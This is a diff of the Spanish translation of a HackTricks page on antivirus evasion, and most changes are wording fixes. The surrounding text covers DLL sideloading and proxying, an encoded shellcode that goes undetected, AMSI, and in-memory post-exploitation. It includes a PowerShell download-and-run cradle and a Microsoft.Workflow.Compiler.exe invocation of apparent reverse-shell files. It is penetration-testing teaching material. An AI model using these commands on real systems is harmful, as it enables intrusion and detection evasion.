@@ -2,6 +2,7 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
+
 **¡Esta página fue escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**
 
 ## **Metodología de Evasión de AV**
@@ -77,11 +78,11 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 Este comando mostrará la lista de programas susceptibles a la suplantación de DLL dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.
 
-Te recomiendo encarecidamente que **explores programas susceptibles a la suplantación de DLL/Sideloadable tú mismo**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas Sideloadable de conocimiento público, podrías ser atrapado fácilmente.
+Te recomiendo encarecidamente que **explores programas susceptibles a la suplantación de DLL/que se pueden cargar lateralmente tú mismo**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas públicamente conocidos que se pueden cargar lateralmente, podrías ser atrapado fácilmente.
 
-Simplemente colocar una DLL maliciosa con el nombre que un programa espera cargar, no cargará tu payload, ya que el programa espera algunas funciones específicas dentro de esa DLL. Para solucionar este problema, utilizaremos otra técnica llamada **DLL Proxying/Forwarding**.
+Simplemente colocar una DLL maliciosa con el nombre que un programa espera cargar, no cargará tu carga útil, ya que el programa espera algunas funciones específicas dentro de esa DLL. Para solucionar este problema, utilizaremos otra técnica llamada **Proxying/Forwarding de DLL**.
 
-**DLL Proxying** reenvía las llamadas que un programa hace desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y pudiendo manejar la ejecución de tu payload.
+**Proxying de DLL** reenvía las llamadas que un programa hace desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y pudiendo manejar la ejecución de tu carga útil.
 
 Estaré utilizando el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)
 
@@ -102,7 +103,7 @@ Estos son los resultados:
 
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como el proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo llamaría eso un éxito.
+¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como el proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo lo llamaría un éxito.
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
@@ -137,7 +138,7 @@ La función AMSI está integrada en estos componentes de Windows.
 - JavaScript y VBScript
 - Macros de Office VBA
 
-Permite a las soluciones antivirus inspeccionar el comportamiento de los scripts al exponer el contenido del script en una forma que es tanto sin cifrar como sin ofuscar.
+Permite a las soluciones antivirus inspeccionar el comportamiento de los scripts al exponer el contenido del script en una forma que es tanto sin cifrar como no ofuscada.
 
 Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.
 
@@ -261,13 +262,13 @@ Aquí hay una demostración para eludir SmartScreen empaquetando cargas útiles 
 
 Cargar binarios de C# en memoria se conoce desde hace bastante tiempo y sigue siendo una excelente manera de ejecutar tus herramientas de post-explotación sin ser detectado por AV.
 
-Dado que la carga útil se cargará directamente en la memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.
+Dado que la carga útil se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.
 
-La mayoría de los marcos C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya ofrecen la capacidad de ejecutar ensamblados de C# directamente en memoria, pero hay diferentes formas de hacerlo:
+La mayoría de los frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya ofrecen la capacidad de ejecutar ensamblados de C# directamente en memoria, pero hay diferentes formas de hacerlo:
 
 - **Fork\&Run**
 
-Esto implica **generar un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y, cuando termines, matar el nuevo proceso. Esto tiene tanto sus beneficios como sus desventajas. El beneficio del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso de implante Beacon. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implante sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Detecciones Comportamentales**.
+Esto implica **generar un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y, cuando termines, matar el nuevo proceso. Esto tiene tanto sus beneficios como sus desventajas. El beneficio del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso de implante Beacon. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implante sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser atrapado por **Detecciones Comportamentales**.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
@@ -465,10 +466,6 @@ catch (Exception err) { }
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
-[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
-
-[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
-
 Descarga y ejecución automáticas:
 ```csharp
 64bit:
